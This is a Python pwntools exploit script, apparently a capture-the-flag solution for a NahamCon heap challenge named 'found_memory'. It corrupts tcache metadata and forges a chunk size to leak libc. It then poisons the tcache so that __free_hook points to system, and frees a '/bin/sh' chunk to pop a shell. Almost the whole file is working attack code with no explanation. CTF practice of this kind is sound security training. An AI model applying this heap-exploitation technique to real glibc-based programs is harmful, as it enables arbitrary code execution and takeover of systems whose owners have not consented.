#!/usr/bin/env python3

from pwn import *

elf = ELF("./found_memory")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = elf
context.terminal = ['tmux', 'splitw', '-hp', '70']
#context.log_level = "debug"
gs = '''
break menu
'''
def start():
    if args.REMOTE:
        return remote("challenge.nahamcon.com", 32396)
    if args.GDB:
        return gdb.debug([elf.path], gdbscript=gs)
    else:
        return process([elf.path])

r = start()

def rcu(d1, d2=0):
  r.recvuntil(d1, drop=True)
  if (d2):
    return r.recvuntil(d2,drop=True)
libcbase = lambda: log.info("libc base = %#x" % libc.address)
logleak = lambda name, val: log.info(name+" = %#x" % val)
sa = lambda delim, data: r.sendafter(delim, data)
sla = lambda delim, line: r.sendlineafter(delim, line)
sl = lambda line: r.sendline(line)
bc = lambda value: str(value).encode('ascii')
demangle_base = lambda value: value << 0xc
remangle = lambda heap_base, value: (heap_base >> 0xc) ^ value

#========= exploit here ===================
rcu(b">")
r.timeout = 1
def alloc():
    sl(b"1")
    line = r.recvline()
    rcu(b">")
    print(line.decode())

def free(index):
    sl(b"2")
    sla(b"Index to free: ", bc(index))
    rcu(b">")

def view(index):
    sl(b"3")
    sla(b"Index to view: ", bc(index))
    
def edit(index, data):
    sl(b"4")
    sla(b"Index to edit: ", bc(index))
    sa(b"Enter data: ", data)
#alloc chunks 24 is more than enough
for i in range(24):
    alloc()

#libc leak
free(0)
free(1)
free(2)
edit(1, p8(0xd0)) 
alloc() # c2 
alloc() # c1 
alloc() # c1 
edit(2, p64(0)+p64(0x441))
free(1) 
view(1)
leak = u64(r.recv(8))
logleak("libc leak", leak)
rcu(b">")
libc.address = leak - 0x1ecbe0
libcbase()

#tcache poison to get a shell by overwriting the free hook ( < glibc 2.31 )
free(19)
free(20)
edit(21, b"/bin/sh\0")
edit(20, p64(libc.sym.__free_hook))
alloc()
alloc()
edit(19, p64(libc.sym.system))
rcu(b">")
#shell
sl(b"2")
sla(b"free:",bc(21))

#========= interactive ====================
r.interactive()
